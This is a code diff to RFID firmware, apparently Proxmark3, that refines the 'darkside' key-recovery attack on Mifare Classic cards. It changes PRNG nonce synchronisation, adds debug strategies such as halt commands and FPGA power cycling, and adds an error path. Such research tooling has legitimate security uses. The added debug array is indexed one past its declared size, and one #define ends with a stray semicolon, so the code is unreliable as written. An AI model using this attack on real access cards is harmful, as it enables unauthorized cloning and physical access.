@@ -2055,19 +2055,20 @@ void ReaderMifare(bool first_try)
 	byte_t par_list[8] = {0x00};
 	byte_t ks_list[8] = {0x00};
 
+	#define PRNG_SEQUENCE_LENGTH  (1 << 16);
 	static uint32_t sync_time;
-	static uint32_t sync_cycles;
+	static int32_t sync_cycles;
 	int catch_up_cycles = 0;
 	int last_catch_up = 0;
+	uint16_t elapsed_prng_sequences;
 	uint16_t consecutive_resyncs = 0;
 	int isOK = 0;
 
 	if (first_try) { 
 		mf_nr_ar3 = 0;
 		sync_time = GetCountSspClk() & 0xfffffff8;
-		sync_cycles = 65536;									// theory: Mifare Classic's random generator repeats every 2^16 cycles (and so do the nonces).
+		sync_cycles = PRNG_SEQUENCE_LENGTH;							// theory: Mifare Classic's random generator repeats every 2^16 cycles (and so do the tag nonces).
 		nt_attacked = 0;
-		nt = 0;
 		par[0] = 0;
 	}
 	else {
@@ -2082,8 +2083,17 @@ void ReaderMifare(bool first_try)
 	LED_C_OFF();
 	
 
-	#define DARKSIDE_MAX_TRIES	32		// number of tries to sync on PRNG cycle. Then give up.
-	uint16_t unsuccessfull_tries = 0;
+	#define MAX_UNEXPECTED_RANDOM	4		// maximum number of unexpected (i.e. real) random numbers when trying to sync. Then give up.
+	#define MAX_SYNC_TRIES			32
+	#define NUM_DEBUG_INFOS			8		// per strategy
+	#define MAX_STRATEGY			3
+	uint16_t unexpected_random = 0;
+	uint16_t sync_tries = 0;
+	int16_t debug_info_nr = -1;
+	uint16_t strategy = 0;
+	int32_t debug_info[MAX_STRATEGY][NUM_DEBUG_INFOS];
+	uint32_t select_time;
+	uint32_t halt_time;
 	
 	for(uint16_t i = 0; TRUE; i++) {
 		
@@ -2096,21 +2106,60 @@ void ReaderMifare(bool first_try)
 			break;
 		}
 		
+		if (strategy == 2) {
+			// test with additional hlt command
+			halt_time = 0;
+			int len = mifare_sendcmd_short(NULL, false, 0x50, 0x00, receivedAnswer, receivedAnswerPar, &halt_time);
+			if (len && MF_DBGLEVEL >= 3) {
+				Dbprintf("Unexpected response of %d bytes to hlt command (additional debugging).", len);
+			}
+		}
+
+		if (strategy == 3) {
+			// test with FPGA power off/on
+			FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
+			SpinDelay(200);
+			iso14443a_setup(FPGA_HF_ISO14443A_READER_MOD);
+			SpinDelay(100);
+		}
+		
 		if(!iso14443a_select_card(uid, NULL, &cuid)) {
 			if (MF_DBGLEVEL >= 1)	Dbprintf("Mifare: Can't select card");
 			continue;
 		}
+		select_time = GetCountSspClk();
 
-		sync_time = (sync_time & 0xfffffff8) + sync_cycles + catch_up_cycles;
-		catch_up_cycles = 0;
+		elapsed_prng_sequences = 1;
+		if (debug_info_nr == -1) {
+			sync_time = (sync_time & 0xfffffff8) + sync_cycles + catch_up_cycles;
+			catch_up_cycles = 0;
 
-		// if we missed the sync time already, advance to the next nonce repeat
-		while(GetCountSspClk() > sync_time) {
-			sync_time = (sync_time & 0xfffffff8) + sync_cycles;
-		}
+			// if we missed the sync time already, advance to the next nonce repeat
+			while(GetCountSspClk() > sync_time) {
+				elapsed_prng_sequences++;
+				sync_time = (sync_time & 0xfffffff8) + sync_cycles;
+			}
 
-		// Transmit MIFARE_CLASSIC_AUTH at synctime. Should result in returning the same tag nonce (== nt_attacked) 
-		ReaderTransmit(mf_auth, sizeof(mf_auth), &sync_time);
+			// Transmit MIFARE_CLASSIC_AUTH at synctime. Should result in returning the same tag nonce (== nt_attacked) 
+			ReaderTransmit(mf_auth, sizeof(mf_auth), &sync_time);
+		} else {
+			// collect some information on tag nonces for debugging:
+			#define DEBUG_FIXED_SYNC_CYCLES	PRNG_SEQUENCE_LENGTH
+			if (strategy == 0) {
+				// nonce distances at fixed time after card select:
+				sync_time = select_time + DEBUG_FIXED_SYNC_CYCLES;
+			} else if (strategy == 1) {
+				// nonce distances at fixed time between authentications:
+				sync_time = sync_time + DEBUG_FIXED_SYNC_CYCLES;
+			} else if (strategy == 2) {
+				// nonce distances at fixed time after halt:
+				sync_time = halt_time + DEBUG_FIXED_SYNC_CYCLES;
+			} else {
+				// nonce_distances at fixed time after power on
+				sync_time = DEBUG_FIXED_SYNC_CYCLES;
+			}
+			ReaderTransmit(mf_auth, sizeof(mf_auth), &sync_time);
+		}			
 
 		// Receive the (4 Byte) "random" nonce
 		if (!ReaderReceive(receivedAnswer, receivedAnswerPar)) {
@@ -2128,19 +2177,37 @@ void ReaderMifare(bool first_try)
 			int nt_distance = dist_nt(previous_nt, nt);
 			if (nt_distance == 0) {
 				nt_attacked = nt;
-			}
-			else {
+			} else {
 				if (nt_distance == -99999) { // invalid nonce received
-					unsuccessfull_tries++;
-					if (!nt_attacked && unsuccessfull_tries > DARKSIDE_MAX_TRIES) {
+					unexpected_random++;
+					if (unexpected_random > MAX_UNEXPECTED_RANDOM) {
 						isOK = -3;		// Card has an unpredictable PRNG. Give up	
 						break;
 					} else {
 						continue;		// continue trying...
 					}
 				}
-				sync_cycles = (sync_cycles - nt_distance);
-				if (MF_DBGLEVEL >= 3) Dbprintf("calibrating in cycle %d. nt_distance=%d, Sync_cycles: %d\n", i, nt_distance, sync_cycles);
+				if (++sync_tries > MAX_SYNC_TRIES) {
+					if (strategy > MAX_STRATEGY || MF_DBGLEVEL < 3) {
+						isOK = -4; 			// Card's PRNG runs at an unexpected frequency or resets unexpectedly
+						break;
+					} else {				// continue for a while, just to collect some debug info
+						debug_info[strategy][debug_info_nr] = nt_distance;
+						debug_info_nr++;
+						if (debug_info_nr == NUM_DEBUG_INFOS) {
+							strategy++;
+							debug_info_nr = 0;
+						}
+						continue;
+					}
+				}
+				sync_cycles = (sync_cycles - nt_distance/elapsed_prng_sequences);
+				if (sync_cycles <= 0) {
+					sync_cycles += PRNG_SEQUENCE_LENGTH;
+				}
+				if (MF_DBGLEVEL >= 3) {
+					Dbprintf("calibrating in cycle %d. nt_distance=%d, elapsed_prng_sequences=%d, new sync_cycles: %d\n", i, nt_distance, elapsed_prng_sequences, sync_cycles);
+				}
 				continue;
 			}
 		}
@@ -2151,6 +2218,7 @@ void ReaderMifare(bool first_try)
 				catch_up_cycles = 0;
 				continue;
 			}
+			catch_up_cycles /= elapsed_prng_sequences;
 			if (catch_up_cycles == last_catch_up) {
 				consecutive_resyncs++;
 			}
@@ -2164,6 +2232,9 @@ void ReaderMifare(bool first_try)
 			else {	
 				sync_cycles = sync_cycles + catch_up_cycles;
 				if (MF_DBGLEVEL >= 3) Dbprintf("Lost sync in cycle %d for the fourth time consecutively (nt_distance = %d). Adjusting sync_cycles to %d.\n", i, -catch_up_cycles, sync_cycles);
+				last_catch_up = 0;
+				catch_up_cycles = 0;
+				consecutive_resyncs = 0;
 			}
 			continue;
 		}
@@ -2171,12 +2242,10 @@ void ReaderMifare(bool first_try)
 		consecutive_resyncs = 0;
 		
 		// Receive answer. This will be a 4 Bit NACK when the 8 parity bits are OK after decoding
-		if (ReaderReceive(receivedAnswer, receivedAnswerPar))
-		{
+		if (ReaderReceive(receivedAnswer, receivedAnswerPar)) {
 			catch_up_cycles = 8; 	// the PRNG is delayed by 8 cycles due to the NAC (4Bits = 0x05 encrypted) transfer
 	
-			if (nt_diff == 0)
-			{
+			if (nt_diff == 0) {
 				par_low = par[0] & 0xE0; // there is no need to check all parities for other nt_diff. Parity Bits for mf_nr_ar[0..2] won't change
 			}
 
@@ -2211,6 +2280,16 @@ void ReaderMifare(bool first_try)
 
 
 	mf_nr_ar[3] &= 0x1F;
+
+	if (isOK == -4) {
+		if (MF_DBGLEVEL >= 3) {
+			for (uint16_t i = 0; i <= MAX_STRATEGY; i++) {
+				for(uint16_t j = 0; j < NUM_DEBUG_INFOS; j++) {
+					Dbprintf("collected debug info[%d][%d] = %d", i, j, debug_info[i][j]);
+				}
+			}
+		}
+	}
 	
 	byte_t buf[28];
 	memcpy(buf + 0,  uid, 4);
